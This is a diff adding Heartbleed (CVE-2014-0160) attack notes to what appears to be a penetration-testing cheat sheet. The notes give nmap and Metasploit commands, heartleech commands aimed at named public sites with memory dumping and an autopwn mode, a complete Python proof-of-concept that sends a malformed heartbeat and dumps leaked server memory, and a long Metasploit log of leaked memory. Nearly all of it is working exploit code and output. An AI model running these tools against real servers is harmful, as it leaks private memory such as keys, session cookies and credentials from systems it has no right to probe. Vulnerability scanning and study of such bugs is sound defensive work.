@@ -6,6 +6,302 @@ With Nmap’s SSL-Heartbleed script it takes a couple seconds to check for this 
 
 The Heartbleed SSL bug was discovered by Neel Mehta from Google Security and announced to the public by the OpenSSL project on April 7th 2014. After companies like Yahoo, Google and Microsoft had a chance to fix Heartbleed on their applications. Researchers at AVG’s Virus Labs said they scanned Alexa’s league table of the top 800,000 sites in the world and found 12,043 (1.5 per cent) are still vulnerable.
 
-# nmap -d –script ssl-heartbleed –script-args vulns.showall -sV [host]
+[NMAP]
+
+- nmap -d –script ssl-heartbleed –script-args vulns.showall -sV <IP>
+- nmap -sV -O -p 443 --script ssl-heartbleed <IP>
+
+[MSF]
+
+- use auxiliary/scanner/openssl_heartbleed
+- set RHOST <IP>
+- set RPORT 443
+- set THREATADS 50
+- set verbose true
+- exploit
 
 http://www.hackingtutorials.org/scanning-tutorials/heartbleed-scanning-using-nmap/
+
+
+
+[HEARTBLEECH]
+
+https://github.com/robertdavidgraham/heartleech
+
+./heartleech --scan www.google.com www.cloudflarechallenge.com www.robertgraham.com oa8gs7diyfuahl.com
+./heartleech www.cloudflarechallenge.com --dump challenge.bin --threads 10
+./heartleech --cert cloudflare.pem --read challenge.bin
+./heartleech www.cloudflarechallenge.com --autopwn --threads 20
+./heartleech --scan smtp.gmail.com:25 --proxy 10.20.30.156:9150 -d
+
+
+
+[How to perform a Heart Bleed Attack Guide]
+https://alexandreborgesbrazil.files.wordpress.com/2014/04/hearbleed_attack_version_a_1.pdf
+
+
+[HEART BLEED SCRIPT]
+
+#!/usr/bin/env python2
+"""
+Author: takeshix <takeshix@adversec.com>
+PoC code for CVE-2014-0160. Original PoC by Jared Stafford (jspenguin@jspenguin.org).
+
+Supportes all versions of TLS and has STARTTLS support for SMTP,POP3,IMAP,FTP and XMPP.
+"""
+
+import sys,struct,socket
+from argparse import ArgumentParser
+
+tls_versions = {0x01:'TLSv1.0',0x02:'TLSv1.1',0x03:'TLSv1.2'}
+
+def info(msg):
+    print '[+] {}'.format(msg)
+
+def error(msg):
+    print '[-] {}'.format(msg)
+    sys.exit(0)
+
+def debug(msg):
+    if opts.debug: print '[*] {}'.format(msg)
+
+def parse_cl():
+    global opts
+    parser = ArgumentParser(description='Test for SSL heartbeat vulnerability (CVE-2014-0160)')
+    parser.add_argument('host', help='IP or hostname of target system')
+    parser.add_argument('-p', '--port', metavar='Port', type=int, default=443, help='TCP port to test (default: 443)')
+    parser.add_argument('-f', '--file', metavar='File', help='Dump leaked memory into outfile')
+    parser.add_argument('-s', '--starttls', metavar='smtp|pop3|imap|ftp|xmpp', default=False, help='Check STARTTLS')
+    parser.add_argument('-d', '--debug', action='store_true', default=False, help='Enable debug output')
+    opts = parser.parse_args()
+
+def hex2bin(arr):
+    return ''.join('{:02x}'.format(x) for x in arr).decode('hex')
+
+def build_client_hello(tls_ver):
+    client_hello = [
+# TLS header ( 5 bytes)
+0x16,               # Content type (0x16 for handshake)
+0x03, tls_ver,         # TLS Version
+0x00, 0xdc,         # Length
+# Handshake header
+0x01,               # Type (0x01 for ClientHello)
+0x00, 0x00, 0xd8,   # Length
+0x03, tls_ver,         # TLS Version
+# Random (32 byte)
+0x53, 0x43, 0x5b, 0x90, 0x9d, 0x9b, 0x72, 0x0b,
+0xbc, 0x0c, 0xbc, 0x2b, 0x92, 0xa8, 0x48, 0x97,
+0xcf, 0xbd, 0x39, 0x04, 0xcc, 0x16, 0x0a, 0x85,
+0x03, 0x90, 0x9f, 0x77, 0x04, 0x33, 0xd4, 0xde,
+0x00,               # Session ID length
+0x00, 0x66,         # Cipher suites length
+# Cipher suites (51 suites)
+0xc0, 0x14, 0xc0, 0x0a, 0xc0, 0x22, 0xc0, 0x21,
+0x00, 0x39, 0x00, 0x38, 0x00, 0x88, 0x00, 0x87,
+0xc0, 0x0f, 0xc0, 0x05, 0x00, 0x35, 0x00, 0x84,
+0xc0, 0x12, 0xc0, 0x08, 0xc0, 0x1c, 0xc0, 0x1b,
+0x00, 0x16, 0x00, 0x13, 0xc0, 0x0d, 0xc0, 0x03,
+0x00, 0x0a, 0xc0, 0x13, 0xc0, 0x09, 0xc0, 0x1f,
+0xc0, 0x1e, 0x00, 0x33, 0x00, 0x32, 0x00, 0x9a,
+0x00, 0x99, 0x00, 0x45, 0x00, 0x44, 0xc0, 0x0e,
+0xc0, 0x04, 0x00, 0x2f, 0x00, 0x96, 0x00, 0x41,
+0xc0, 0x11, 0xc0, 0x07, 0xc0, 0x0c, 0xc0, 0x02,
+0x00, 0x05, 0x00, 0x04, 0x00, 0x15, 0x00, 0x12,
+0x00, 0x09, 0x00, 0x14, 0x00, 0x11, 0x00, 0x08,
+0x00, 0x06, 0x00, 0x03, 0x00, 0xff,
+0x01,               # Compression methods length
+0x00,               # Compression method (0x00 for NULL)
+0x00, 0x49,         # Extensions length
+# Extension: ec_point_formats
+0x00, 0x0b, 0x00, 0x04, 0x03, 0x00, 0x01, 0x02,
+# Extension: elliptic_curves
+0x00, 0x0a, 0x00, 0x34, 0x00, 0x32, 0x00, 0x0e,
+0x00, 0x0d, 0x00, 0x19, 0x00, 0x0b, 0x00, 0x0c,
+0x00, 0x18, 0x00, 0x09, 0x00, 0x0a, 0x00, 0x16,
+0x00, 0x17, 0x00, 0x08, 0x00, 0x06, 0x00, 0x07,
+0x00, 0x14, 0x00, 0x15, 0x00, 0x04, 0x00, 0x05,
+0x00, 0x12, 0x00, 0x13, 0x00, 0x01, 0x00, 0x02,
+0x00, 0x03, 0x00, 0x0f, 0x00, 0x10, 0x00, 0x11,
+# Extension: SessionTicket TLS
+0x00, 0x23, 0x00, 0x00,
+# Extension: Heartbeat
+0x00, 0x0f, 0x00, 0x01, 0x01
+    ]
+    return client_hello
+
+def build_heartbeat(tls_ver):
+    heartbeat = [
+0x18,       # Content Type (Heartbeat)
+0x03, tls_ver,  # TLS version
+0x00, 0x03,  # Length
+# Payload
+0x01,       # Type (Request)
+0x40, 0x00  # Payload length
+    ] 
+    return heartbeat
+
+def hexdump(s):
+    for b in xrange(0, len(s), 16):
+        lin = [c for c in s[b : b + 16]]
+        hxdat = ' '.join('%02X' % ord(c) for c in lin)
+        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
+        print '  %04x: %-48s %s' % (b, hxdat, pdat)
+
+def rcv_tls_record(s):
+    try:
+        tls_header = s.recv(5)
+        if not tls_header:
+            error('Unexpected EOF (header)')            
+        typ,ver,length = struct.unpack('>BHH',tls_header)
+        message = ''
+        while len(message) != length:
+            message += s.recv(length-len(message))
+        if not message:
+            error('Unexpected EOF (message)')
+        debug('Received message: type = {}, version = {}, length = {}'.format(typ,hex(ver),length,))
+        return typ,ver,message
+    except Exception as e:
+        return None,None,None
+
+if __name__ == '__main__':
+    parse_cl()
+
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(5)
+        info('Connecting...')
+        s.connect((opts.host, opts.port))
+    except Exception as e:
+        error(str(e))
+
+    if opts.starttls:
+        BUFSIZE=4096
+        if opts.starttls == 'smtp':
+            re = s.recv(BUFSIZE)
+            debug(re)
+            s.send('ehlo starttlstest\r\n')
+            re = s.recv(BUFSIZE)
+            debug(re)
+            if not 'STARTTLS' in re:
+                debug(re)
+                error('STARTTLS not supported')
+            s.send('starttls\r\n')
+            re = s.recv(BUFSIZE)
+        elif opts.starttls == 'pop3':
+            s.recv(BUFSIZE)
+            s.send('STLS\r\n')
+            s.recv(BUFSIZE)
+        elif opts.starttls == 'imap':
+            s.recv(BUFSIZE)
+            s.send('STARTTLS\r\n')
+            s.recv(BUFSIZE)
+        elif opts.starttls == 'ftp':
+            s.recv(BUFSIZE)
+            s.send('AUTH TLS\r\n')
+            s.recv(BUFSIZE)
+        elif opts.starttls == 'xmpp':
+            s.send("<stream:stream xmlns:stream='http://etherx.jabber.org/streams' xmlns='jabber:client' to='%s' version='1.0'\n")
+            s.recv(BUFSIZE)
+    
+    supported = False
+    for num,tlsver in tls_versions.items():
+        info('Sending ClientHello for {}'.format(tlsver))
+        s.send(hex2bin(build_client_hello(num)))
+        info('Waiting for Server Hello...')
+        while True:
+            typ,ver,message = rcv_tls_record(s)
+            if not typ:
+                error('Server closed connection without sending ServerHello for {}'.format(tlsver))
+                continue
+            if typ is 22 and ord(message[0]) is 0x0E:
+                info('Reveiced ServerHello for {}'.format(tlsver))
+                supported = num
+                break
+        if supported: break
+
+    if not supported:
+        error('No TLS version is supported')
+
+    info('Sending heartbeat request...')
+    s.send(hex2bin(build_heartbeat(supported)))
+
+    while True:
+        typ,ver,message = rcv_tls_record(s)
+        if not typ:
+            error('No heartbeat response received, server likely not vulnerable')
+        if typ is 24:
+            info('Received heartbeat response:')
+            if len(message) > 3:
+                if opts.file:
+                    try:    
+                        f = open(opts.file,'w')
+                        f.write(message)
+                        f.flush()
+                        f.close()
+                        debug('Written leaked memory into {}'.format(opts.file))
+                    except Exception as e:
+                        error(str(e))
+                else:
+                    hexdump(message)
+                info('Server is vulnerable!')
+                sys.exit(0)
+            else:
+                error('Server processed malformed heartbeat, but did not return any extra data.')
+        elif typ is 21:
+            error('Received alert')
+
+
+
+[HEART BLEED EXPLOITED]
+
+msf auxiliary(openssl_heartbleed) > exploit
+
+[*] 192.168.200.179:443 - Sending Client Hello...
+[*] SSL record #1:
+[*] 	Type:    22
+[*] 	Version: 0x0301
+[*] 	Length:  54
+[*] 	Handshake #1:
+[*] 		Length: 50
+[*] 		Type:   Server Hello (2)
+[*] 		Server Hello Version:           0x0301
+[*] 		Server Hello random data:       535fa710e0fd73e686fab65747bf5b99bba98fc7905e312091e4d32c271ebee5
+[*] 		Server Hello Session ID length: 0
+[*] 		Server Hello Session ID:        
+[*] SSL record #2:
+[*] 	Type:    22
+[*] 	Version: 0x0301
+[*] 	Length:  631
+[*] 	Handshake #1:
+[*] 		Length: 627
+[*] 		Type:   Certificate Data (11)
+[*] 		Certificates length: 624
+[*] 		Data length: 627
+[*] 		Certificate #1:
+[*] 			Certificate #1: Length: 621
+[*] 			Certificate #1: #<OpenSSL::X509::Certificate subject=#<OpenSSL::X509::Name:0x00000007cb7490>, issuer=#<OpenSSL::X509::Name:0x00000007cb73c8>, serial=#<OpenSSL::BN:0x00000007cb7300>, not_before=2014-04-23 10:19:01 UTC, not_after=2015-04-23 10:19:01 UTC>
+[*] SSL record #3:
+[*] 	Type:    22
+[*] 	Version: 0x0301
+[*] 	Length:  203
+[*] 	Handshake #1:
+[*] 		Length: 199
+[*] 		Type:   Server Key Exchange (12)
+[*] SSL record #4:
+[*] 	Type:    22
+[*] 	Version: 0x0301
+[*] 	Length:  4
+[*] 	Handshake #1:
+[*] 		Length: 0
+[*] 		Type:   Server Hello Done (14)
+[*] 192.168.200.179:443 - Sending Heartbeat...
+[*] 192.168.200.179:443 - Heartbeat response, 65535 bytes
+[+] 192.168.200.179:443 - Heartbeat response with leak
+[*] 192.168.200.179:443 - Printable info leaked:
+......Wb$@..:...H....{.....!..k.@.p.....f.....".!.9.8.........5.............................3.2.....E.D...../...A.......................................curl/7.21.0 OpenSSL/0.9.8o zlib/1.2.3.4 libidn/1.15 libssh2/1.2.6..Host: heartbleed.hacking-lab.com..Accept: */*.......Z*Y....bc.A.o.^*................. keep-alive.....|..u.r.....>...onnection: keep-alive......Wrp%.~8@B.<....... .]......3t.........h2.spdy/3.1.http/1.1......................................5..................................................................................................................................... repeated 15662 times .....................................................................................................................................@..................................................................................................................................... repeated 16122 times .....................................................................................................................................@.....................................................................................................................................................................................................................................................................................................................................a@..P.......w.KP.....%2.*..G..Cih...!......$.../.-......%.#u>.j.;.4.i3..(..;.{.Et.f......3..d.iA...y..,.=D..S..X+H..#$X....nl^.dF...xg...........z*._~'+..].;p..2?A.GC.%z.O..$S....j\.q..4 ....=.a.........*_e.o..M ...#.@.!...C.~Y.{.$.....k2...#.1..-.|.x.+q.C.J.mU......1}......a......Q..O....l...L....z...dQxO....81..O.&.._..1.E...dY.......;#..O..\....yD.........0.g..e.....l...N?.............`....jV........@.+>...]...f.}E.....y...y.k.k.....vT.....j.<...,.{...P...(...3.....;a..A}b.c....G..e.H&..<.!...^.......z\..C.\...E:.&z1.}.....J.}...........).U...%.....Q....x%k#.<,.MZct......H..j.$.J.I.`.MK.0...Y..<. @.\..t2.q.CHs...e.D......l....I...U6...PD.g.....n.az...{....n......\.l R..M.k.%d.b4....G......#..'Q......i./?O...4.c.O..!c...`Bjf_..G..m[..........t.q-j.w]D..{........Wv^....?r..F.1...'....G....t9.'b....S....$..I.....B?OS.Yq.RuAcvI$...x.....:.r^.`.N....{.b..j....+...i...vs..mc..s.,....q...1..A;.C..P&.....&..v.6....r..a.{.[%.U.x.'......oG.N...XB.[. ..@..\.h......Q.y`....'.....V...FQA..C..i.X.5$........W>..........:k.e#t........N....l^....=.ju.@L...... .........R..0.be...p./...,]w.....`0..F.......,D.F....N.......nE[S..f......?5....e............q{.S.N...a..5..(...............l.C.K.=. '... .=...pd. .h......<$i...Cl.^vek1..&6.B8k.?...)u7.d$.^V..D....BQ./...3..A.HY.C.]|U(........*.d.Tk..............|'......o..v.......8....=...G.&._*e@....d..T.Q#.J.O...k.....u{....X...............z..sI2....6x],?..-.K....M.o.yzu..{.....F..I...I.2..U......n..d....w0.l.S...[..k..F!.$....K#8nO(..}............)R....6....2_BE.J.@.......b.............E..A...Q....0.'...}..e....`...]S.Wu.C.6..'....IBj.D...x{.]..zg......I.C......J..m..AY..*$....;.[...e..d....j.n..w..(.L..e>..v...........,.Vz.z.N?.bw..us.r`.=xlL...>=.YS..v..........y c..%m^>.mC..,...l....G......90...P*.......d.....hyFt......v....Mc..z.GM..Bg......^....n..|;0...ok..R._......1dn..(...yy....vL.........%...3'7..........B.%.....`....}.V.e2..6"v.....R!.)....9...OE...jQ..TPaw....d...z.y.......Y.O..@P.{.#r.5.d>...Y.Z.0yS.LH.&...7..f?&..XMM......XJ...n.~.x....{B .....#.+....N....T...J~9.....g...6....=`y{>.....'.....V{Z/EM....I4.x|U..%....o....W....pd...2..v.....<......1.......8`......Kk.......(..fa.7...h.V....(.[...-.............#nW9...H..m.!.q.(.....3.g.B..({.V....*.......@.0}l....U....p..1l...@4......(ms.O.T. .......|...1...L:|.......?q...P.}B....v.\.0...i.OS+...>...u."..%)7...._4pL....1....k.].W.URC.o...=P`..)..6.Pk..l..wh?.x..."...w...<.pB....M.....Mz.../Ig..g..L.~y...h;..E.0<R.....)....9..~N.<O5..R....F..._..o.C'.....AlD...>a_n.....v.B..#...E.D...........x>M...MnXu.H-.....cJ}.57...R._?.V..B.Sv..\..W..\...D]+.a...n.9.....sc.h>e3y.v.su..*nD.^.39..L...q..-.....P......J..^.{]...n0.m.]....O..H,.ks.c^. .UHeE.#..._tx1..R...l...v...U...@X..b...M....&8..v7.s..)..-b.).......5 .`.....R.....Y...0.}...zw..\R.w1.Y.$=[.\1F9 .i..s#. ....3...*O]......M....Vmp...=.........].=..X.V....M.E.:....3e.Y.....8....U=j......E5...O...c...8G.6#... /..!..T..mUo..8....C<|..nOo/......q..^<.....8Ts&..1F...5...1..2v....".5.....P..i....\l<5..C(....Cd.t/.H.jc.m..<..:/.y7M<7..%...al.+....O;.g....G.%Ege.....z...}n..s.0...q.0.A.9A......n.v..`..."....y....}n[.q.p......"`-.4..J0.....m1u`....?}..1./.8...TTA .....W.....L3.rO.v...D#.i...Moy.K...."..Wo.:R......xw%..".>.L().;J......#v....._}$b.....B..M....Vd.5.}..ut...~.9.o.VG....N.......D(....w.T.j..Y......xz?.wUQB..c8:..Vm.n.[.+.".j..`..0......8..:...6.w.......'.tl.6........b@.6.,*Ey.s9h}.{..)...mz.*...}T~.PE...".%iX.;.V*.>G".I<.....'\.^......apH.^9N(.^0M.....6"..1.{ .8..7a.D.#..jE...j<........sN.....Z....bVR........>@...';.'.A.....n".5/.tqB.....}geQ.EuL.[.G......?.......1.......yB....ia...Z.1.3#>3.h<..`...L.e...K@.y...6...].T^.....D.uwX........vf2>.1..N.......1v....^-........C.M....$.......,..sm.>.9.v.t.C...R....+K..!.$N.^.W(.$.......... .;.....Z.Cf.=&....".kX..e*o..#.....]'PL...z.~I.m.O..............rJ"....R.....O.E.L`vG..|..>X...U.)...'..oa.r.#."T2._.iS...x......................f..u.5....%N.W+..+.<.u....)..+$.l....\I..-5T.>.G....4..h>.H|2...6.......U.+`......0c.u..e..,{.....H...Y.'...?.+.F.3...A...R`|....h.4..P....hT.Z..{.Q.....1E\O..Up,...i...c-...{F..i.r...B.......+..GK.....f.6.-.d.......86/....j.........^R..AQ.j(.......{m."..(l....R..n...AW..pB..2.si.j<>.&..W....B.C;yO.!lR(......zh.A.?..O.[.....1.G5..B};1.Q.RY..~..0...l.s.Df.+......d3./1......^GD.e............_.C....^.`g.......k.\$Z+Bq.....p.../>.....n...g`..z{=d.....'.......~..."........h.h.y.6.Ax.3.S.i...E;V.p1...R.....q.h6....~u.,...H:..Z..1..?.....a.}..qH(...P6=j....utA..f_........`.......j.I..Nl.....o.V..7^....].t.^K.<........>.....r}W9.o.4.j..<S.w....l..`u.......4.........x( V......oM.......6[P....>..:.q..r..y..{.]eD. ....H.......H...g....L.E.../....=b..[.x..5E.b.-..........X...$8St.......Y,.X.#..G...X.R...b........?7.J..z....q..:..O.........V7....rt.3........j"...F|-9WO.g.:..gJJ5.Q.k,..D'f..r..7irVn..iF..#Y... o.........\.....1... h.C...@A....^.H.}..pVp.+L.3.&T......._......1....>9J}..T.qfg....j....I...P.a\+.VM...ZD......-..6..#......pw.#..=.....HPB6...+wN-.`.E.6.e.....+GF.<(...nO.KQ....M8.A.].........p...i.gY.r....c(,x:.O..3..cY.(.....O(.]...m~.....X.q6.e.........b.8.....z9........D.2.J..e.+.........p..[.d>*K.xWZ.4.S.S..-wA.I..+c.....+.$.O/..5.f...C..>..2..1.>..2...h......n7.CCR...H..$e...^....b.g(...$.vS$.....m.7..l._...$h...6.\!.Nud.P...GN...D,.M.1..L.I.......e.p....,.0..!.ED/.h..E/I.....q..C}.Oj..T.a.W../b..I....q./.*.5.."....B...j........3..s../......$.......$..K.....~.I....7AQ..8..C..s..d.+...=...#..M....Ru ......_.q6..u........kR..d44A. N..A..F.^_..`...s... ..y.....\..:@U..n./(. /J>$Kj..)...d.....|.zOQ......D.|..X. .m.m_..'....l.O...9.,..H.....%....y.c.{.u.{...H3,.......k...Q ...Y..6]....X.i`.G.8\t..pa...#.]Z.2\.....<....W.(j..1b...zK4....o..#...|.5..c.F?O.......OO.E.....v=......ZhD6...<.mS....TZ..1.....#...E..P..rb....XG..`t............i.,D^.V.4... #\|.<..;.CJ|..?.P....>...M#..T...,.+-..@.<....Rj..w#^.yB...T....p..8.....;.......%...s.1..^.Q.c.E...8p.......].(@.Q......*Y.Q...W..8B...} .......P..%-.V..@.C.._.1..S....E3..(7~......dE.W[..o..u.4.l...:.G.ZO.J.?..v...&k8.....7._$Z.h.<.n....|v/'..........D8.._u..!.......suiZH........2/&Ae=...>+..-.I}V@.4.5.e2{.)u..=...T....w.......!......U.!.....].k.J.3...|.d..!!K..0.....[D.S..I-.......kp...+........#..........i.A......\.......;......GG.B.B.%W....#..,..-.V....#R.....m....k.r.N.....awHok.P....KW.|d..+.e..{1.Oe'..&...J.;).X........v.z....P..)1../V.2.b.qf.Bf.D........`......\..{2..H.N.5.&.]...Z}..!K!;........j...V....j.....j...w.;.....dM....[c]..q...?._x&..IAI.h`..J->...6.k..v............w....+-.....x....5..#~F...(=...XS..c<...-.........3O.D.s4......V+..O.EIY...j.=@#X.3R.pa.)i..z.....J.O/..<....L.4>.:.R............U(^e.V`..C......R.....v.?.{...`_.o)...7.[Bj.l.N.3..a.X@.4..NT8i..q.[.&.Gy<...n,..D.Csb>.5.?...r..h:.\J.g.B.."D....1G...L.rY...s@G..n.T..,...I.D....*q...u..u...W.....v.h@.K....4...%.Y.OC....z..=...=...V..6....u...05ER.....'...ju.............$..zB.{,.......8...y<^|7{.,!YB.....*C.:Yc.....~z..P.) z...=...Y,....x.....:..wU4.-...>....5.Q%".e.`.s....3.@.J.e.....z.M...>4}.^..3F../.(.Va=......_....w.])-...l......].c..kr..b?;.......U..0P..g[...y7..F^..9.T..n..,..I..g<:D2....8.r.(.[l.X...m;..!..bx;.W7#...h...7....`.J.p...R)}...F.......K..0 s<....IG. .7..\W..?...o.}.y"...ut..H./........?W.nH9H.;.......zNhk........W....I......Y...@S.f..r.d........,.....Z.........Y......./....8. .nq&........K.......V......f..}.6....`gm8.o....Ce...%...[..U.....0.=CHk....4M.[.$....%.....Y|.45....,`..3.Q.C.....Ym.v.F...Cp..B.<..).....#....+.q...w.-....2.U..pz./.....\..;O.....H.4}......g.L7..;.w.......Sb.<G.`"H...R..?..../....>...y.;.....`...{[.....Y...W.......P.......V.#.?...Bm.......I....y.........%..fn.......er.C..dzPX.\p...Z......N....,....o..4as...h......vv....HO.;....;..]...l.*FtB.....3)6zdM..:..!<.|..KTK.q..,......,.=k.D).K-tAd.FE......F.9..%.&i....}W...=$.?..s.....q...=....$.....vG...I;WL/.@?em.......,n;.lo..U...c<..4....Z7...@......v....7.~....\.k..]g.....m5/>....P..%.k.w.....1@...0....."...n.k3b.*6<;.....q.......}x.b....*E$..+........|...J,V.F.A.%...}0.U.@.@...f.]....W5NK..p.....8..5p.>.A_.9.......+.c2/.L.?.*.....M.....h#8..T.....[W.{...^S.7..e....[$.O.tZ..N.Z...<j.w....xB.6.M.4...w...(84...s../.......)....2&.!.r...=;..Z27.w|]..H..G_......5d.E7......(.~..._f.;.)..C......]X'.....w...<..S.N.`...Ymr.,..f..v....]=...L+.._..9o2.Y5H......s%.sq...B.a.g........v6.AIl5......n.+.Sd#.L..pof..^.l..........HT^..q...*}.]K.#.:../<....9X..UB.3..X4....i..U........?...tg..0..g.b.V...d......*.....>.$JE^........M..}.=...z..<1V.7..<.....`.p8^.5r..Y.Mx.+M.....!T...' d.$.).jx..b..*8*.<U.v...-.DA...4.K.s.~2j...0Q...j....t%...@ZV%...r....SQ....?...2....#....\6,.bYN}z~..m......MQ...~.>.3.P...w..._1}JV.............x....f.8L..<y8d...@d.3..LR........h..dH.tQ...w~..b..k..O...X".r..mF^....9..p......#.pk.n.....R....h.O3..\.....l..../dD......@z....bV......S...%G..k.&./....a....w].h.W6...K..].`..Z.O...=...-. F..........b.....)p....@.SO.4/.cP=.+.a.gP.B.a.A.....p.@=..(Z)...c..].0....r..}.R.a'.!iP...J*..8...=....ctm9..E.....G..w;....J.....0$lym...Wm,.@..|@.@!.yO....,8..4.....Z..Z..!....7.~..vF.B......iP..S.K...^G.b...?..}.02t.t.-.*..Xh......)...#..%mD.D.8.L.k..2qHW]..+......0...^D...m.,.R...x7..ha.C'......S?]e.E1.^z..l./....CL'.V2&..Wl}.....c....c.q......H.......I..e...!...~....Xm.RB.~.o...]8S.p.<;..21.%..k.w...f.D.<..W7.^...:.n...."...;....?..dz......)..I....Jb.[........W.O.H.....d....".....-...~.^.JM.6........Q....k.-..J.{..?.,...............BNC+....f?.qQN.0.GQ... ..[P.c.i.1..1B.V...f..%/....H......CE.....\S.(...t..[.%.d..s ....WhZ..........._.v.......B.@.8...L.Z.P....b-..(D.@.....GJ..r.+.o.[........?...L%......Y....am....E......nk..+....$w..5.U....\f.c..e|s0.tx.h6".....<....z.jVj...<...:.&h....h.X....z.FM'.J..........L..<2..Z_tq......&..Y.i.`......5..`&._.q.0....tx..Qd.....{.'pc.....=...h..^.tz.]...,G.M...W.......EDi@..0......s=...nS.........j.F.0x.N...<.K............/...._ .#..3...X....`.tm.H.|.K3wH...("j..@2.c.l..0....$h..b.......q....u......3....w..(.K..sb[(...Z.Z,.....i..2b.j&d.......z?..u1.....gA..H..8.hr...]....VW..?...3*..$.7.5..g.....te...r.[..<T.5......./.Roc((.........[..N..!...[x....t(.=R...-...k.v..7....."..q.G.. .'.N.....`Y.7.....z.`............ .#....*}.tF.....FW...+.m.r.v>..L.|..':...Ka...tFn.t...%.....g.x..5..d..r..qG..GZ}...}.W.o......M...o6....Cu.0.s.N..D...W.O....it...Kky~...-`~...|...w.Y\..;.....Q3.m%.0:..~...k...b.3...9 ...`.%.L....v.......$..w.K:.._........2.u)..N.*`..t......G.;..k.UQ...~..."^...J.......2!W:.........>5.....R.......!....,=(.%.Un..c....I.t.....".E...m.....Ax.....p.........\....y.VmZ..2.s....lR..YM..-q...4T.....!..aV.0.<.H...Y<.pm....O..|.......*..PQ.RO...~s...@...Q.....E...;..../...Bv[..~-[.....S.8.(.|......4....0..@.O-........K.#...k.D...,?.9]...V&%...CWV.....%.G.<h..pqw....~$w..._..j$....A....FOJ(.FR..M..........S......ED..a}.X.!....._.....z.;M/._.h".....B...............L.%...2.f...&,zu.p...R0..d....j.(.....s6..Z]T3>Z......\..h.Wv..N...z..r`...:....)....5]j..f.`..X..~.n'r......f.}&..E.VK...8...Q.X...u...3..8.(....Nf)w-M......VE...Pm....E....W.Z.....u...;.>.WX%.gE.......!{=*N:3..O%U.18...r.....?.0.._........PQN....3\q3...sl.....^..EQ..(...A.a.JH....bBi.^j....-...g...Z}H.!0=r.&~..4.h..$.....`e.2.......D.X..h...,}....=.t..l.....<.AV.5.......mt....*k3EZ,T<Y......*.o;"_..<......V....C..:....x..!..6...`.....%....`..1B$....k.....+6`......WU...r..._pv<..`...*I."..tL>A.;"....]$......W.-.4N48,.8jlw1..W.X....!.$..........Z`h..U!@.....&h.!4..oyf....+.>`..N....@K...~..k.(@...N.c..hU...9.y....{..f...^...y.cu....;TbeEv.U#.:iDm6`..<....\.C{....f<....i.=!/f.A...-}..\...g..l..7...`/.N.`U...I.a.=.R.OW...(...8i|`Z....E[3.2k4. NB....-...o)\...n......-..34.........{N..L.P.u?...xBi}....^..j.D.9E.5.....gD.........U....K......U....)..r....M|.....o.....9....9..[p..J`t/.}.Ob...\....G..&...x.l...1.wvi.e/.f....v.nL..B'zZ..,..S.U=.A...^+M..B0.*..&...?.F}r..........\<..-...e..Z..V.....)O....8.u..5.[.T..s......]....H.b...r.CD.t...WeM......\.p..Q....&.U).,s....Z......g5...9eU...fUP.h.....,.#../3...i\Y2.Vcz..B....m.*.=...MB..a>pZ}....M.<..n.C.s....v.3.r.a......V.._.{.y.T....&....3`..r....\.T...Y#Z..G.......`...=i&W..0v.....{8..".4.J!.7...C......cp%..&..........g...g.FK\kP{].@.k..$.%~........B..../..v.../....".....%}...KW.z...q..U3k.$.0.....]XOU.i..i..j..'=JOTS.4.*c?...gS6]...<\.....7.u.....-...-r....L..$..M.AO....=E{P.'..;."<.....8..=...fj..$.j.z2..[KBA.aNq.Kn.........Uh]$..s.&]H._MC.`.TX...=...+?.u...;.G.....c.MC.....H.2*-..i.y..R..Ge..[....,J..2F.;..e....KN..ud...[=.y..K........A..9...q..z.S..cr..d..@.../.d...8.LQ.B..9"...u2.....<:.o..;.}.........2.r..d.<j..g..j..Pi9..Y_3.S...>.e.o.38k......K...w...Y....3l..u..p>b6....Kb]xq...8.....2.....9.*Q..f...O...)...z....xo........"...5.&0.D=..w....<...@q...1..T+U.{I%~x........8....;...S.....e.P$......U.g..GWj.ke..W.Z..a.X...f.).gk.<U.....~..Q=..G.r.U"...Kw.UJ......1I.l.....ul.q.x./..o.h....7...$...,y..,z...|.....K......'.s_p.............Nj...kQ.D.0.6...<......K%...TGk..Q*..S..*@.[.).xTB....Y.u....k4........T..Zfi.MK'.....kD..-....x.y....Q.....2...0.<E.l............-O6.."...K.n3.Qc....Q...A..._|....f...e.=......6..H.t..H..x..c dr.d!=WQ.`.gW=~.I@s.QP.....Z..Xe..'z.I.#l.2{.<..........yu....jA."MY..EM.P.0..-...>.>*R....G.nO..........&...........Ee.PRa....R...........].....'.+........S.....%`...,..XV.*..&#..6.]..<.(.(u...z..v:3.s..\.P....Q.{..^.d..Z.iia..o."h#C..5.~..d}..w...pF#H...Uz......)..P.........H...[..G......Jn.VK.._I.....z..;{.*.;....s/..,lN...xj .4..vovNj...y[...V.d......"bm..............f.]....'rV\........N. ....`*.{..{I.....4.C.Z..`.%a.h.1..0..k....I....Ar.=.......A{...\sIi.b....8.T..B2.&Q.F<O....Jv.H....o.E0..J....K.>.!.@.w?+,.........X..f...Zw..Z&y..FP...r.2..g.9*=.*....==.&wW.u........{......1.NG..P...y.xQ.D`..&..2M^....:,....$..c(.h7.6...e{.O.y......?....a."...Q`.1....2..........\...Z.2......*.m./...4.._..}J...Y]2BT........\........,.....t9.....W3.r.....s..b.\.....%}.ck..AL...B....CR.....4u...eM...e..!.......2....."&..$w.^...k..1..............[...(...a...In,_.*?|...g...G.....C^..Av.....D..R...x....>./5^.pU....w.c.#"...H.....U.l3.tg....x$.v..4(?Y..m.....z..-n1........J..T.BNw..Y. ....2.8-..:.aN..!._...q....A8Q.!.:D.......K..&45n}.!ke4o.d.X.Y?`W..E...4...cPp..-..4Z.l...f......gF.).]d.:....$.......`.x.$..%.fd.I.4..~am$...)O_..e.k...9..P....}......D~...fL......}..{.....a..$..y...C...f$u..V%K.{..m..'.......kY.z...#....&lcR.5.7.!.$.q*....(n.o..lm..uH.VC..d..u.a..$.....v.5.,...9.4S.sd.8.}.k eH.E.?+D.......+.p.....T6...|P.v....|....'......W=......;..e.@(/.....{..K..f............d..%.B...p.......;!..Hy..n~..Zm..o.%BnH|b..7.6...jC.....W.f...@..E@._.}.s?..9..M.....{.Y...X...yi. ..\ ..8..dxf.8..G..qXt....o..!....>'..<..5.J".[.4....AeO...Q....a.....|,...=.q|...Yo...F....B....$..-....Is.X.....F>.3~U....@..&.....D.....koO.,..t.Q 